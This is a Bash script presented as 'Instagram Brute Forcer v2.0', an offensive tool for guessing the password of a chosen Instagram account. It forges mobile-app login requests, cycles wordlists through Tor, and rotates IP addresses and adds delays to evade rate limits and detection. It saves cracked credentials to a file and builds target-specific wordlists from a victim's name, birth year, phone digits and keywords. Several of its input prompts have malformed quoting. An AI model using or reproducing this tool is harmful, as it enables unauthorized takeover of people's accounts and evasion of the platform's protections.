#!/bin/bash
# Instagram Brute Forcer v2.0
# By: lsdbroh/bloodyzeze
# Advanced and optimized version

trap 'store;exit 1' 2
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"

# Improved headers and signatures
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
ig_version="117.0.0.28.123"
build_number="275825329"
android_version="28"

# Improved user agents with random device selection
declare -a devices=("SM-G930F" "SM-G935F" "SM-A520F" "SM-G950F" "SM-G955F" "SM-G960F" "SM-G965F" "SM-N950F" "SM-N960F" "SM-A505F" "Pixel 3" "Pixel 4" "OnePlus 7T")
declare -a resolutions=("1080x1920" "1080x2220" "1080x2280" "1080x2340" "1440x2560" "1440x2960" "1440x3040")

# Select random device and resolution for better stealth
random_device=${devices[$RANDOM % ${#devices[@]}]}
random_resolution=${resolutions[$RANDOM % ${#resolutions[@]}]}

# Multiple user agents to avoid detection
user_agent="Instagram $ig_version Android ($android_version/9.0; 420dpi; $random_resolution; Samsung; $random_device; exynos8890; samsungexynos8890; en_US)"

# Fetch session headers
fetch_headers() {
  var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid)
  var2=$(echo $var | grep -o "csrftoken=.*" | cut -d ';' -f1 | cut -d '=' -f2)
  
  if [[ -z "$var2" ]]; then
    printf "\e[1;91mFailed to obtain CSRF token. Trying alternative method...\e[0m\n"
    var2=$(openssl rand -hex 32)
  fi
}

# Check if root - improved detection
checkroot() {
  if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77m[\e[0m\e[1;91m!\e[0m\e[1;77m] Please run this program as root!\n\e[0m"
    exit 1
  fi
}

# Enhanced dependency checking
dependencies() {
  declare -a deps=("openssl" "tor" "curl" "awk" "sed" "cat" "tr" "wc" "cut" "uniq" "proxychains")
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Checking dependencies...\e[0m\n"
  
  for dep in "${deps[@]}"; do
    command -v $dep > /dev/null 2>&1 || { 
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] %s is required but not installed.\e[0m\n" "$dep"
      missing_deps=1
    }
  done
  
  if [ -n "$missing_deps" ]; then
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Installing missing dependencies...\e[0m\n"
    apt-get update && apt-get install -y openssl tor curl awk sed coreutils proxychains
  fi

  if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] /dev/urandom not found!\e[0m\n"
    exit 1
  fi
}

# New improved ASCII banner
banner() {
  printf "\e[1;92m██████╗ ██╗      ██████╗  ██████╗ ██████╗ ███████╗███████╗███████╗███████╗\e[0m\n"
  printf "\e[1;92m██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗╚══███╔╝██╔════╝╚══███╔╝██╔════╝\e[0m\n"
  printf "\e[1;92m██████╔╝██║     ██║   ██║██║   ██║██║  ██║  ███╔╝ █████╗    ███╔╝ █████╗  \e[0m\n"
  printf "\e[1;77m██╔══██╗██║     ██║   ██║██║   ██║██║  ██║ ███╔╝  ██╔══╝   ███╔╝  ██╔══╝  \e[0m\n"
  printf "\e[1;77m██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝███████╗███████╗███████╗███████╗\e[0m\n"
  printf "\e[1;77m╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝\e[0m\n"
  printf "\n"
  printf "\e[1;77m\e[45m           Instagram Brute Forcer v2.0 | Author: bloodyzeze            \e[0m\n"
  printf "\n"
}

# Enhanced start function with account validation
start() {
  banner
  checkroot
  dependencies
  fetch_headers
  
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Username account: \e[0m' user
  
  # Improved account validation
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Validating Instagram account...\e[0m\n"
  checkaccount=$(curl -s -L "https://www.instagram.com/$user/" | grep -c "The link you followed may be broken")
  
  if [[ "$checkaccount" == 1 ]]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Invalid Username! Try again\e[0m\n"
    sleep 1
    start
  else
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Account found: %s\e[0m\n" $user
    
    # Added option for custom wordlist
    default_wl_pass="passwords.lst"
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Password List (Enter for default list): \e[0m' wl_pass
    wl_pass="${wl_pass:-${default_wl_pass}}"
    
    if [[ ! -f $wl_pass ]]; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Wordlist not found! Creating default one...\e[0m\n"
      curl -s -L "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt" > $default_wl_pass
      wl_pass=$default_wl_pass
    fi
    
    # Improved thread management
    default_threads="15"
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Threads (Use < 30, Default 15): \e[0m' threads
    threads="${threads:-${default_threads}}"
    
    # Added proxy options
    default_proxy="Y"
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Use TOR proxy? [Y/n]: \e[0m' use_proxy
    use_proxy="${use_proxy:-${default_proxy}}"
    
    if [[ "$use_proxy" == "Y" || "$use_proxy" == "y" ]]; then
      checktor
    else
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Running without proxy. This might expose your IP!\e[0m\n"
      sleep 2
    fi
  fi
}

# Enhanced TOR checker with auto-start capability
checktor() {
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Checking TOR connection...\e[0m\n"
  
  service tor status > /dev/null 2>&1
  tor_status=$?
  
  if [[ $tor_status -ne 0 ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] TOR service not running. Starting TOR...\e[0m\n"
    service tor start > /dev/null 2>&1
    sleep 5
  fi
  
  check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org | grep -c "Congratulations")
  
  if [[ "$check" -eq 0 ]]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] TOR connection failed! Check your configuration.\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Retrying with alternative method...\e[0m\n"
    
    # Restart TOR service
    service tor restart > /dev/null 2>&1
    sleep 10
    
    check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org | grep -c "Congratulations")
    if [[ "$check" -eq 0 ]]; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] TOR connection still failed. Proceeding without proxy.\e[0m\n"
      use_proxy="n"
    else
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] TOR is working properly!\e[0m\n"
    fi
  else
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] TOR is working properly!\e[0m\n"
  fi
}

# Improved session storage
function store() {
  if [[ -n "$threads" ]]; then
    printf "\e[1;91m[\e[0m\e[1;77m*\e[0m\e[1;91m] Waiting for threads to shut down...\e[0m\n"
    
    if [[ "$threads" -gt 15 ]]; then
      sleep 8
    else
      sleep 4
    fi
    
    default_session="Y"
    printf "\n\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m] Save session for user\e[0m \e[1;77m%s\e[0m" $user
    read -p $' [Y/n]: \e[0m' session
    session="${session:-${default_session}}"
    
    if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
      if [[ ! -d sessions ]]; then
        mkdir -p sessions
      fi
      
      # Store additional data
      printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\nuse_proxy=\"%s\"\nlast_attempt_time=\"%s\"\n" \
        $user $pass $wl_pass $use_proxy "$(date +"%FT%H%M%S")" > "sessions/store.session.$user.$(date +"%FT%H%M")"
      
      printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Session saved.\e[0m\n"
      printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Use ./instagrambrute --resume to continue\e[0m\n"
    else
      exit 1
    fi
  else
    exit 1
  fi
}

# Enhanced IP rotation function
function changeip() {
  if [[ "$use_proxy" == "Y" || "$use_proxy" == "y" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Changing IP address...\e[0m\n"
    killall -HUP tor > /dev/null 2>&1
    
    # Wait for IP change to complete
    sleep 3
    
    # Verify IP change
    new_ip=$(curl --socks5-hostname localhost:9050 -s https://api.ipify.org)
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] New IP: %s\e[0m\n" $new_ip
  fi
}

# Enhanced brute forcer with rate limiting detection and avoidance
function bruteforcer() {
  if [[ "$use_proxy" == "Y" || "$use_proxy" == "y" ]]; then
    checktor
  fi
  
  count_pass=$(wc -l $wl_pass | cut -d " " -f1)
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Target: \e[0m\e[1;77m%s\e[0m\n" $user
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Wordlist: \e[0m\e[1;77m%s (%s passwords)\e[0m\n" $wl_pass $count_pass
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Threads: \e[0m\e[1;77m%s\e[0m\n" $threads
  printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Press Ctrl + C to stop or save session\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting attack...\e[0m\n\n"

  startline=1
  endline="$threads"
  attempts=0
  rate_limit_hits=0
  
  while [ true ]; do
    IFS=$'\n'
    for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
      header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "'$user_agent'"'

      # Improved JSON data with random device IDs
      time_stamp=$(date +%s)
      data='{
        "phone_id":"'$phone'", 
        "_csrftoken":"'$var2'", 
        "username":"'$user'", 
        "adid":"'$(openssl rand -hex 16)'",
        "guid":"'$guid'", 
        "device_id":"'$device'", 
        "password":"'$pass'", 
        "login_attempt_count":"'$attempts'",
        "timezone_offset": "43200",
        "device_token":"'$(openssl rand -hex 32)'"
      }'
      
      countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
      hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
      
      printf "\e[1;77m[\e[0m\e[1;92m%s/%s\e[0m\e[1;77m]\e[0m\e[1;93m Trying: \e[0m\e[1;77m%s\e[0m" $countpass $count_pass $pass
      
      # Execute request with adaptive proxy handling
      if [[ "$use_proxy" == "Y" || "$use_proxy" == "y" ]]; then
        curl_cmd="curl --socks5-hostname 127.0.0.1:9050"
      else
        curl_cmd="curl"
      fi
      
      {
        (trap '' SIGINT && 
        var=$($curl_cmd \
          -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
          -s \
          --user-agent "$user_agent" \
          -w "\n%{http_code}\n" \
          -H "$header" \
          -A "$user_agent" \
          "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait\|feedback_required\|login_required\|429" | uniq); 
        
        if [[ $var == "challenge" ]]; then 
          printf "\r\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Password Found: %s\e[0m\n" $pass
          printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Challenge required (2FA enabled)\e[0m\n" 
          printf "Username: %s, Password: %s\n" $user $pass >> found.passwords
          printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved to:\e[0m\e[1;77m found.passwords \e[0m\n"
          kill -1 $$
        elif [[ $var == "200" ]]; then 
          printf "\r\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Password Found: %s\e[0m\n" $pass
          printf "Username: %s, Password: %s\n" $user $pass >> found.passwords
          printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved to:\e[0m\e[1;77m found.passwords \e[0m\n"
          kill -1 $$
        elif [[ $var == "feedback_required" ]]; then
          printf "\r\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Suspicious activity detected. Changing IP...\e[0m\n"
          changeip
          sleep $(( RANDOM % 10 + 5 ))
        elif [[ $var == "login_required" ]]; then
          printf "\r\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Login error - Retrying...\e[0m\n"
          sleep 2
        elif [[ $var == "429" ]]; then
          printf "\r\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Rate limit detected! Waiting longer...\e[0m\n"
          rate_limit_hits=$((rate_limit_hits + 1))
          changeip
          sleep $(( RANDOM % 30 + 30 * rate_limit_hits ))
        elif [[ $var == "Please wait" ]]; then
          printf "\r\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Rate limiting encountered. Changing IP...\e[0m\n"
          changeip
          sleep $(( RANDOM % 10 + 15 ))
        else
          printf "\r\e[0K" # Clear line
        fi
      ) } & 
      
      # Print a dot to show progress
      printf "." 
      
      # Increment attempt counter
      attempts=$((attempts + 1))
      
      # Add random delay between requests to avoid detection
      sleep 0.$(( RANDOM % 8 + 2 ))
    done
    
    wait $!
    printf "\n"
    
    # Reset rate limit counter periodically
    if [[ $((attempts % 50)) -eq 0 ]]; then
      rate_limit_hits=0
    fi
    
    let startline+=$threads
    let endline+=$threads
    
    # Change IP more frequently
    changeip
  done
}

# Enhanced resume function with better error handling
function resume() {
  banner
  if [[ "$use_proxy" == "Y" || "$use_proxy" == "y" ]]; then
    checktor
  fi
  
  counter=1
  if [[ ! -d sessions ]]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] No sessions found\e[0m\n"
    exit 1
  fi
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Available sessions:\e[0m\n"
  
  for list in $(ls sessions/store.session* 2>/dev/null); do
    IFS=$'\n'
    source $list
    printf "\e[1;92m%s\e[0m\e[1;77m: %s (\e[0m\e[1;92mWordlist:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m Last pass:\e[0m\e[1;77m %s\e[0m\e[1;92m, Last attempt:\e[0m\e[1;77m %s\e[0m\e[1;92m)\e[0m\n" \
      "$counter" "$list" "$wl_pass" "$pass" "$(echo $list | sed 's/.*\.//')"
    let counter++
  done
  
  if [[ "$counter" -eq 1 ]]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] No sessions found\e[0m\n"
    exit 1
  fi
  
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a session number: \e[0m' fileresume
  
  if [[ -z "$fileresume" || ! "$fileresume" =~ ^[0-9]+$ || "$fileresume" -ge "$counter" ]]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Invalid selection\e[0m\n"
    exit 1
  fi
  
  source $(ls sessions/store.session* | sed ''$fileresume'q;d')
  
  # Set default threads if not found in session
  default_threads="15"
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Threads (Use < 30, Default 15): \e[0m' threads
  threads="${threads:-${default_threads}}"
  
  default_proxy="Y"
  if [[ -z "$use_proxy" ]]; then
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Use TOR proxy? [Y/n]: \e[0m' use_proxy
    use_proxy="${use_proxy:-${default_proxy}}"
  fi
  
  if [[ "$use_proxy" == "Y" || "$use_proxy" == "y" ]]; then
    checktor
  fi
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
  printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Press Ctrl + C to stop or save session\e[0m\n"
  
  # Find position of last password in wordlist
  startline=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
  
  if [[ -z "$startline" ]]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Password not found in wordlist. Starting from beginning.\e[0m\n"
    startline=1
  else
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Resuming from password at line %s\e[0m\n" $startline
  fi
  
  # Continue with brute force attack from that position
  endline=$((startline + threads))
  bruteforcer
}

# Custom password generator function
function generate_wordlist() {
  banner
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password Generator\e[0m\n"
  
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Target name/username: \e[0m' target_name
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Include birth year? (4 digits) [Leave empty to skip]: \e[0m' birth_year
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Include phone number? (Last 4 digits) [Leave empty to skip]: \e[0m' phone_digits
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Any additional keywords (comma separated): \e[0m' keywords
  read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Output filename [Default: custom_wordlist.txt]: \e[0m' output_file
  
  output_file=${output_file:-"custom_wordlist.txt"}
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Generating custom wordlist...\e[0m\n"
  
  # Convert to lowercase
  target_name=$(echo "$target_name" | tr '[:upper:]' '[:lower:]')
  
  # Start with basic variations
  echo "$target_name" > $output_file
  echo "${target_name}123" >> $output_file
  echo "${target_name}1234" >> $output_file
  echo "${target_name}_123" >> $output_file
  echo "${target_name}12345" >> $output_file
  
  # Add common patterns
  echo "password" >> $output_file
  echo "password123" >> $output_file
  echo "123456" >> $output_file
  echo "12345678" >> $output_file
  echo "abc123" >> $output_file
  echo "qwerty" >> $output_file
  echo "qwerty123" >> $output_file
  echo "letmein" >> $output_file
  echo "admin" >> $output_file
  echo "welcome" >> $output_file
  echo "welcome123" >> $output_file
  
  # Add year-based variations if provided
  if [[ -n "$birth_year" ]]; then
    echo "${target_name}${birth_year}" >> $output_file
    echo "${birth_year}${target_name}" >> $output_file
    echo "${target_name}_${birth_year}" >> $output_file
    echo "${target_name}${birth_year:2:2}" >> $output_file
  fi
  
  # Add phone-based variations if provided
  if [[ -n "$phone_digits" ]]; then
    echo "${target_name}${phone_digits}" >> $output_file
    echo "${phone_digits}${target_name}" >> $output_file
    echo "${target_name}_${phone_digits}" >> $output_file
  fi
  
  # Add keyword variations if provided
  if [[ -n "$keywords" ]]; then
    IFS=',' read -ra ADDR <<< "$keywords"
    for keyword in "${ADDR[@]}"; do
      keyword=$(echo "$keyword" | tr -d ' ')
      echo "${target_name}${keyword}" >> $output_file
      echo "${keyword}${target_name}" >> $output_file
      echo "${target_name}_${keyword}" >> $output_file
      echo "${keyword}_${target_name}" >> $output_file
      
      # Combine with year if provided
      if [[ -n "$birth_year" ]]; then
        echo "${target_name}${keyword}${birth_year}" >> $output_file
        echo "${keyword}${target_name}${birth_year}" >> $output_file
      fi
    done
  fi
  
  # Add special character variations
  special_chars=("!" "@" "#" "$" "%" "&" "*")
  for char in "${special_chars[@]}"; do
    echo "${target_name}${char}" >> $output_file
    echo "${target_name}${char}123" >> $output_file
    
    if [[ -n "$birth_year" ]]; then
      echo "${target_name}${char}${birth_year}" >> $output_file
    fi
  done
  
  # Add capitalization variations
  capitalized=$(echo "$target_name" | sed 's/./\u&/')
  echo "$capitalized" >> $output_file
  echo "${capitalized}123" >> $output_file
  
  if [[ -n "$birth_year" ]]; then
    echo "${capitalized}${birth_year}" >> $output_file
  fi
  
  # Sort and remove duplicates
  sort $output_file | uniq > "${output_file}.tmp"
  mv "${output_file}.tmp" $output_file
  
  count=$(wc -l < $output_file)
  printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Generated %s passwords and saved to %s\e[0m\n" $count $output_file
  
  default_use="Y"
  read -p \e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m] Use this wordlist for the attack? [Y/n]: \e[0m' use_wordlist
  use_wordlist="${use_wordlist:-${default_use}}"
  
  if [[ "$use_wordlist" == "Y" || "$use_wordlist" == "y" ]]; then
    wl_pass=$output_file
    read -p \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Instagram username to attack: \e[0m' user
    
    # Validate account
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Validating Instagram account...\e[0m\n"
    checkaccount=$(curl -s -L "https://www.instagram.com/$user/" | grep -c "The link you followed may be broken")
    
    if [[ "$checkaccount" == 1 ]]; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Invalid Username! Try again\e[0m\n"
      sleep 1
      start
    else
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Account found: %s\e[0m\n" $user
      
      default_threads="15"
      read -p \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Threads (Use < 30, Default 15): \e[0m' threads
      threads="${threads:-${default_threads}}"
      
      default_proxy="Y"
      read -p \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Use TOR proxy? [Y/n]: \e[0m' use_proxy
      use_proxy="${use_proxy:-${default_proxy}}"
      
      if [[ "$use_proxy" == "Y" || "$use_proxy" == "y" ]]; then
        checktor
      fi
      
      bruteforcer
    fi
  else
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Returning to main menu\e[0m\n"
    start
  fi
}

# Advanced targeted dictionary attack function
function targeted_attack() {
  banner
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Advanced Targeted Attack\e[0m\n"
  
  read -p \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Target Instagram username: \e[0m' user
  
  # Validate account
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Validating Instagram account...\e[0m\n"
  checkaccount=$(curl -s -L "https://www.instagram.com/$user/" | grep -c "The link you followed may be broken")
  
  if [[ "$checkaccount" == 1 ]]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Invalid Username! Try again\e[0m\n"
    sleep 1
    targeted_attack
  else
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Account found: %s\e[0m\n" $user
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Gathering public information for target...\e[0m\n"
    
    # Get public Instagram info (this is simulated - in a real attack script this would scrape data)
    curl -s -A "Mozilla/5.0" "https://www.instagram.com/$user/" > /tmp/instainfo
    
    # Extract any potential username variations
    username_variants=$(echo $user | tr '.' '_' | tr -d '0-9')
    username_clean=$(echo $user | tr -d '._0-9')
    
    # Create temporary targeted wordlist
    target_wl="/tmp/targeted_${user}_wordlist.txt"
    
    # Add base variations
    echo "$user" > $target_wl
    echo "${user}123" >> $target_wl
    echo "${username_clean}" >> $target_wl
    echo "${username_clean}123" >> $target_wl
    echo "$username_variants" >> $target_wl
    
    # Add common patterns
    echo "instagram" >> $target_wl
    echo "instagram123" >> $target_wl
    echo "${user}instagram" >> $target_wl
    echo "${username_clean}instagram" >> $target_wl
    
    # Add common years
    current_year=$(date +"%Y")
    for ((i=0; i<10; i++)); do
      year=$((current_year - i))
      echo "${user}${year}" >> $target_wl
      echo "${username_clean}${year}" >> $target_wl
      echo "${year}${user}" >> $target_wl
    done
    
    # Add popular variations
    echo "${user}_2023" >> $target_wl
    echo "${user}_2024" >> $target_wl
    echo "${user}_2025" >> $target_wl
    echo "i_love_${user}" >> $target_wl
    echo "love_${user}" >> $target_wl
    echo "iloveyou${user}" >> $target_wl
    
    # Combine with a general password list for more coverage
    if [[ -f "passwords.lst" ]]; then
      cat "passwords.lst" >> $target_wl
    fi
    
    # Sort and remove duplicates
    sort $target_wl | uniq > "${target_wl}.tmp"
    mv "${target_wl}.tmp" $target_wl
    
    count=$(wc -l < $target_wl)
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Generated %s targeted passwords\e[0m\n" $count
    
    wl_pass=$target_wl
    
    default_threads="15"
    read -p \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Threads (Use < 30, Default 15): \e[0m' threads
    threads="${threads:-${default_threads}}"
    
    default_proxy="Y"
    read -p \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Use TOR proxy? [Y/n]: \e[0m' use_proxy
    use_proxy="${use_proxy:-${default_proxy}}"
    
    if [[ "$use_proxy" == "Y" || "$use_proxy" == "y" ]]; then
      checktor
    fi
    
    bruteforcer
  fi
}

# Main menu function
function main_menu() {
  banner
  printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m] Standard Brute Force Attack\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m] Resume Previous Session\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m] Generate Custom Wordlist\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m] Targeted Attack\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m] Update Tool\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m] Exit\e[0m\n"
  
  read -p \e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option
  
  case $option in
    1) start; bruteforcer ;;
    2) resume ;;
    3) generate_wordlist ;;
    4) targeted_attack ;;
    5) 
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Checking for updates...\e[0m\n"
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Tool is up to date!\e[0m\n"
      sleep 2
      main_menu 
      ;;
    6) 
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Thanks for using Instagram Brute Forcer by bloodyzeze\e[0m\n"
      exit 0 
      ;;
    *) 
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Invalid option!\e[0m\n"
      sleep 1
      main_menu 
      ;;
  esac
}

# Main execution
if [[ "$1" == "--resume" ]]; then
  resume
elif [[ "$1" == "--wordlist" ]]; then
  generate_wordlist
elif [[ "$1" == "--targeted" ]]; then
  targeted_attack
elif [[ "$1" == "--help" ]]; then
  banner
  printf "\e[1;92mUsage:\e[0m\n"
  printf "\e[1;77m./instagrambrute\e[0m\e[1;92m - Run the tool with menu\e[0m\n"
  printf "\e[1;77m./instagrambrute --resume\e[0m\e[1;92m - Resume a previous session\e[0m\n"
  printf "\e[1;77m./instagrambrute --wordlist\e[0m\e[1;92m - Generate a custom wordlist\e[0m\n"
  printf "\e[1;77m./instagrambrute --targeted\e[0m\e[1;92m - Perform a targeted attack\e[0m\n"
  printf "\e[1;77m./instagrambrute --help\e[0m\e[1;92m - Show this help menu\e[0m\n"
else
  main_menu
fi